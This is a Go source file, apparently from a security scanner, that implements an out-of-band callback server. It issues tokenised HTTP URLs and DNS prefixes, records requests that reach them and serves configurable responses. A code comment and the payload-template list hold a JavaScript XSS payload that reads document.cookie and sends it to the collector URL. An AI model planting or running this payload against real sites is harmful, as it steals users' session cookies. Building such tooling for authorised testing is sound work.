/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package reverse

import (
	"embed"
	"encoding/json"
	"fmt"
	"io/fs"
	"net/http"
	"net/http/httputil"
	"strconv"
	"strings"
	"sync"
	"time"
	"wscan/core/utils"
	logger "wscan/core/utils/log"

	"github.com/julienschmidt/httprouter"
)

type HTTPServer struct {
	Server                *http.Server
	Router                *httprouter.Router
	config                *Config
	db                    *DB
	internalGroupEventMap *sync.Map
}

func (s *HTTPServer) Close() error {
	return s.Server.Close()
}

func (s *HTTPServer) Fail(w http.ResponseWriter, data any) {
	s.response(w, Response{
		Data:         data,
		ResponseBase: ResponseBase{Code: 1},
	}, 200)
}

func (s *HTTPServer) Success(w http.ResponseWriter, data any) {
	s.response(w, Response{
		Data:         data,
		ResponseBase: ResponseBase{Code: 0},
	}, 200)
}

func (s *HTTPServer) HandleGenerateDNSDomain(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
	groupID := utils.RandLowLetterNumber(4)
	ret := struct {
		GroupID            string `json:"groupID"`
		IsDomainNameServer bool   `json:"isDomainNameServer"`
		Prefix             string `json:"prefix"`
		Root               string `json:"root"`
		Server             string `json:"server"`
	}{
		GroupID:            groupID,
		IsDomainNameServer: false,
		Prefix: fmt.Sprintf("p-%s-%s",
			generateHashedToken(s.config.Token, groupID, ""), groupID),
		Root:   s.config.DNSServerConfig.Domain,
		Server: s.config.DNSServerConfig.ListenIP,
	}
	s.Success(w, ret)

}

func (s *HTTPServer) HandleGenerateHTTPTemplateURL(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
	groupID := utils.RandLowLetterNumber(4)
	ret := struct {
		GroupID string `json:"groupID"`
		URL     string `json:"url"`
	}{
		GroupID: groupID,
		URL: fmt.Sprintf("http://%s/t/%s/%s/", s.config.HTTPServerConfig.GetAddr(),
			generateHashedToken(s.config.Token, groupID, ""), groupID),
	}

	s.Success(w, ret)
}

func (s *HTTPServer) HandleGenerateHTTPURL(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
	// {"code":0,"data":{"groupID":"OZ5s","url":"http://0.0.0.0:188/p/76b1ab/OZ5s/"}}
	groupID := utils.RandLowLetterNumber(4)
	ret := struct {
		GroupID string `json:"groupID"`
		URL     string `json:"url"`
	}{
		GroupID: groupID,
		URL: fmt.Sprintf("http://%s/p/%s/%s/", s.config.HTTPServerConfig.GetAddr(),
			generateHashedToken(s.config.Token, groupID, ""), groupID),
	}

	s.Success(w, ret)
}

func (s *HTTPServer) HandleFetchEvent(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
	var rfeq remoteFetchEventRequest
	var ret fetchEventResponse
	if err := json.NewDecoder(r.Body).Decode(&rfeq); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	for _, group := range rfeq.GroupToSearch {
		value, loaded := s.internalGroupEventMap.Load(group)
		if loaded {
			ret.Event = append(ret.Event, value.(*Event))
		}
	}
	for _, group := range rfeq.GroupToDelete {
		s.internalGroupEventMap.Delete(group)
	}

	s.response(w, ret, 200)
}

// (new Image()).src="http://0.0.0.0:188/p/869fa0/yIvA/?cookie="+encodeURIComponent(document.cookie);
func (s *HTTPServer) HandleHealthCheck(w http.ResponseWriter, r *http.Request, p httprouter.Params) {
	s.response(w, Response{ResponseBase: ResponseBase{Code: 0}, Data: "Login Required"}, 200)
}

func (s *HTTPServer) HandleInternalUnitVisit(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
	s.HandleUnitVisit(w, r, params, false)
}

// http://0.0.0.0:88/_/api/event/list?lastID=&count=10&eventType=rmi&action=Next
// http://10.42.54.15:188/_/api/cland/event/list?lastID=&count=10&eventType=dns&action=Next
func (s *HTTPServer) HandleListEvent(w http.ResponseWriter, r *http.Request, params httprouter.Params) {

	queryParams := r.URL.Query()
	// 获取特定参数的值
	lastID := queryParams.Get("lastID")
	count := 10
	if queryParams.Get("count") != "" {
		count, _ = strconv.Atoi(queryParams.Get("count"))

	}
	eventType := queryParams.Get("eventType")
	action := queryParams.Get("action")
	ret, total := s.db.listEvent(eventType, lastID, count, action)
	s.Success(w, ListEventResp{
		Total:  total,
		Events: ret,
	})

}

func (s *HTTPServer) HandlePayloadTemplate(http.ResponseWriter, *http.Request, httprouter.Params) {

}

func (s *HTTPServer) HandleEventStats(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
	stats := s.db.getEventStats()
	s.Success(w, stats)
}

func (s *HTTPServer) HandlePublicUnitVisit(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
	s.HandleUnitVisit(w, r, params, true)
}

func (s *HTTPServer) HandleUnitVisit(w http.ResponseWriter, r *http.Request, params httprouter.Params, public bool) {
	group := params.ByName("group")
	unit := params.ByName("unit")
	hashedToken := params.ByName("token")
	if generateHashedToken(s.config.Token, group, unit) != hashedToken {
		s.LoginRequired(w)
		return
	}
	data, err := httputil.DumpRequest(r, true)
	if err != nil {
		logger.Info("failed to dump request!!")
	}
	ev := &Event{
		GroupID:     group,
		UnitID:      unit,
		EventType:   "http",
		EventSource: "public",
		Request:     string(data),
		RemoteAddr:  r.RemoteAddr,
		TimeStamp:   time.Now().UnixMilli(),
	}
	s.db.storeEvent(ev)
	logger.Infof("reverse http server received request [%s/%s], remoteAddr: %s", group, unit, r.RemoteAddr)
	s.internalGroupEventMap.Store(group, ev)
	httpResponseConfig := s.db.getHTTPResponse(group)
	if httpResponseConfig != nil {
		statusCode, _ := strconv.Atoi(httpResponseConfig.StatusCode)
		w.WriteHeader(statusCode)
		w.Write([]byte(httpResponseConfig.Body))
	} else {

	}
}

func (s *HTTPServer) LoginRequired(w http.ResponseWriter) {
	s.response(w, Response{ResponseBase: ResponseBase{Code: 2}, Data: "Login Required"}, 200)
}

func (s *HTTPServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if strings.HasPrefix(r.URL.Path, "/_/api/") && !s.checkToken(r) {
		s.response(w, Response{ResponseBase: ResponseBase{Code: 2}, Data: "Login Required"}, 200)
		return
	}
	s.Router.ServeHTTP(w, r)
}

func (s *HTTPServer) Start() {

}

func (s *HTTPServer) checkToken(r *http.Request) bool {
	// 检查请求头中的 X-Token 值
	token := r.Header.Get("X-Token")
	return token == s.config.Token
}

func (s *HTTPServer) handleSetDNSResponse(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
	var drf DNSResponseConfig
	if err := json.NewDecoder(r.Body).Decode(&drf); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	s.db.setDNSResponse(&drf)
	s.Success(w, nil)
}

func (s *HTTPServer) handleSetHTTPResponse(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
	var hrc HTTPResponseConfig
	if err := json.NewDecoder(r.Body).Decode(&hrc); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	s.db.setHTTPResponse(&hrc)
	s.Success(w, nil)
}

func (s *HTTPServer) handleListHTTPResponses(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
	list := s.db.listHTTPResponses()
	type tmplWithURL struct {
		HTTPResponseConfig
		URL string `json:"url"`
	}
	ret := make([]*tmplWithURL, 0, len(list))
	for _, hrc := range list {
		item := &tmplWithURL{
			HTTPResponseConfig: *hrc,
			URL: fmt.Sprintf("http://%s/t/%s/%s/",
				s.config.HTTPServerConfig.GetAddr(),
				generateHashedToken(s.config.Token, hrc.GroupID, ""), hrc.GroupID),
		}
		ret = append(ret, item)
	}
	s.Success(w, ret)
}

func (s *HTTPServer) handleDeleteHTTPResponse(w http.ResponseWriter, r *http.Request, _ httprouter.Params) {
	groupID := r.URL.Query().Get("groupID")
	if groupID == "" {
		s.Fail(w, "groupID is required")
		return
	}
	s.db.deleteHTTPResponse(groupID)
	s.Success(w, nil)
}

func (s *HTTPServer) handleListPayloadTemplates(w http.ResponseWriter, r *http.Request, params httprouter.Params) {
	ret := []PayloadTemplate{
		{Name: "简单 xss 模板", Description: "使用 js 获取 cookie 并回传 (自定义模板稍后开放)", Suffix: "x.js",
			CommonResponseComponent: CommonResponseComponent{
				StatusCode: "200",
				Header: []map[string]string{{
					"key":   "Content-Type",
					"value": "text/javascript",
				}},
				Body: "(new Image()).src=\"{{.reportURL}}?cookie=\"+encodeURIComponent(document.cookie);",
			}},
	}
	s.Success(w, ret)
}

func (s *HTTPServer) response(w http.ResponseWriter, data any, status int) {
	jsonResponse, err := json.Marshal(data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_, err = w.Write(jsonResponse)
	if err != nil {
		logger.Error(err)
	}
}

//go:embed avatar
var template embed.FS

func NewHTTPServer(config *Config, internalGroupEventMap *sync.Map, db *DB) *HTTPServer {
	server := HTTPServer{
		Router:                httprouter.New(),
		internalGroupEventMap: internalGroupEventMap,
		config:                config,
		db:                    db,
	}
	logger.Infof("reverse server webUI: http://%s/avatar/", config.HTTPServerConfig.GetAddr())
	fSys, err := fs.Sub(template, "avatar")
	if err != nil {
		logger.Fatal(err)
	}
	server.Router.ServeFiles("/avatar/*filepath", http.FS(fSys))
	server.Router.GET("/_/api/event/list", server.HandleListEvent)
	server.Router.POST("/_/api/fetch", server.HandleFetchEvent)
	server.Router.GET("/_/api/health_check", server.HandleHealthCheck)
	server.Router.GET("/_/api/avatar/template/list", server.handleListPayloadTemplates)
	server.Router.GET("/_/api/avatar/generate/http_url", server.HandleGenerateHTTPURL)
	server.Router.GET("/_/api/avatar/generate/dns_domain", server.HandleGenerateDNSDomain)
	server.Router.POST("/_/api/avatar/generate/set_http_response", server.handleSetHTTPResponse)
	server.Router.POST("/_/api/avatar/generate/set_dns_response", server.handleSetDNSResponse)
	server.Router.GET("/_/api/avatar/http_responses", server.handleListHTTPResponses)
	server.Router.DELETE("/_/api/avatar/http_response", server.handleDeleteHTTPResponse)
	server.Router.GET("/_/api/avatar/generate/http_template_url", server.HandleGenerateHTTPTemplateURL)
	server.Router.GET("/_/api/avatar/event/list", server.HandleListEvent)
	server.Router.GET("/_/api/avatar/event/stats", server.HandleEventStats)
	server.Router.GET("/i/:token/:group/:unit/", server.HandleInternalUnitVisit)
	server.Router.GET("/i/:token/:group/", server.HandleInternalUnitVisit)
	server.Router.GET("/p/:token/:group/:unit/", server.HandlePublicUnitVisit)
	server.Router.GET("/p/:token/:group/", server.HandlePublicUnitVisit)
	server.Router.GET("/t/:token/:group/:unit/", server.HandlePublicUnitVisit)
	server.Router.GET("/t/:token/:group/", server.HandlePublicUnitVisit)

	server.Server = &http.Server{
		Handler: server.Router, // 设置路由处理器
	}
	return &server

}

func httpServerCheckAndPrepare(config *Config) {
	if config.HTTPServerConfig.Enabled {
		if config.Token == "" {
			logger.Fatal("please fill in the token of reverse")
		}

		if config.HTTPServerConfig.ListenIP == "" {
			logger.Fatal("reverse server listen ip can not be empty")
		}
		if config.DBFilePath == "" {

		}
	}

	// utils.GetAvailableRandPort() // utils_GetFreePort
}
